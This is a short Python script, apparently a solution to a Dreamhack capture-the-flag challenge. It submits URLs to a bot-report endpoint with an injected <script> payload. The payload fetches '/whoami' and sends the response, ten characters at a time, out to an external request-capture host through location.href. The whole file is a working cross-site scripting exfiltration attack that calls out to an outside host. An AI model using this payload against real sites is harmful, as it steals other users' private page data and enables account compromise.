import requests

port = 13502
url = f"http://host8.dreamhack.games:{port}/report"

attack_url = "https://xauwqsd.request.dreamhack.games"


data = {"path": ""}

for i in range(10):
    print(f"{i}번째")
    start = 1680 + i * 10
    end = 1690 + i * 10
    path = f"/intro?name=<script>fetch('/whoami').then(r=>r.text()).then(t=>{{ location.href='{attack_url}/data='.concat(t.slice({start},{end}))}});</script>&detail=1"
    data["path"] = path
    requests.post(url, data=data)
